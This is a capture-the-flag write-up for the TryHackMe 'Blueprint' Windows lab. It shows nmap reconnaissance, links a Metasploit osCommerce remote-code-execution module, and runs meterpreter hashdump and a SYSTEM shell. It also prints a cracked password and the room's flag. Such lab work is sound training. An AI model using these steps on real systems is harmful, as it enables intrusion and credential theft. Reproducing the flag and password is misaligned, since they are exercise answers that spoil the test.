---
title: "Blueprint - TryHackMe"
author: Ludovic COULON
date: 2020-05-28
hero: ./images/hero.jpeg
excerpt: "Writeup for the Blueprint on TryHackMe"
---

[TryHackMe | Blueprint](https://tryhackme.com/room/blueprint)

<div className="Image__Small">
  <img src="https://webstockreview.net/images/win-clipart-blueprint-1.png" alt="blog_image" />
</div>

Do you have what is takes to hack into this Windows Machine?

`It might take around 3-4 minutes for the machine to boot.`

### Setup

```bash
➜  TryHackMe nmap -A -vv 10.10.80.61
```

```bash
PORT      STATE SERVICE     REASON  VERSION
135/tcp   open  msrpc       syn-ack Microsoft Windows RPC

139/tcp   open  netbios-ssn syn-ack Windows 7 Home Basic 7601 Service Pack 1 netbios-ssn

443/tcp   open  ssl/http    syn-ack Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Bad request!
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1

3306/tcp  open  mysql       syn-ack MariaDB (unauthorized)

8080/tcp  open  http        syn-ack Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods:
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
49152/tcp open  msrpc       syn-ack Microsoft Windows RPC
49153/tcp open  msrpc       syn-ack Microsoft Windows RPC
49154/tcp open  msrpc       syn-ack Microsoft Windows RPC
49158/tcp open  msrpc       syn-ack Microsoft Windows RPC
Service Info: Hosts: www.example.com, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
| nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:05:ad:f5:e5:be (unknown)
| Names:
|   BLUEPRINT<00>        Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   BLUEPRINT<20>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   02 05 ad f5 e5 be 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 41714/tcp): CLEAN (Couldnt connect)
|   Check 2 (port 54382/tcp): CLEAN (Couldnt connect)
|   Check 3 (port 22612/udp): CLEAN (Failed to receive data)
|   Check 4 (port 23038/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-05-28T19:03:48+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-05-28T18:03:50
|_  start_date: 2020-05-28T18:03:02
```

<div className="Image__Small">
  <img src="https://imgur.com/rUJpFMM.png" alt="blog_image" />
</div>

[osCommerce 2.3.4.1 - Remote Code Execution by DanielRTeixeira · Pull Request #9821 · rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework/pull/9821/files/b5681cb954bed6a1e64cf6708cbd5a937e596f5b)

<div className="Image__Small">
  <img src="https://imgur.com/nrRw0SU.png" alt="blog_image" />
</div>

<div className="Image__Small">
  <img src="https://imgur.com/lecapcm.png" alt="blog_image" />
</div>

### #1 "Lab" user NTML hash decrypted

```bash
meterpreter > run hashdump
```

<div className="Image__Small">
  <img src="https://imgur.com/J5xg1PX.png" alt="blog_image" />
</div>

```bash
googleplus
```

### #2 root.txt

```bash
meterpreter > shell
C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes> whoami
nt authority\system
C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes> cd C:\User\Administrator\Desktop
C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes> type root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://i.imgur.com/hejzVWP.png" alt="TryhackMeProfile" />
  </a>
</center>
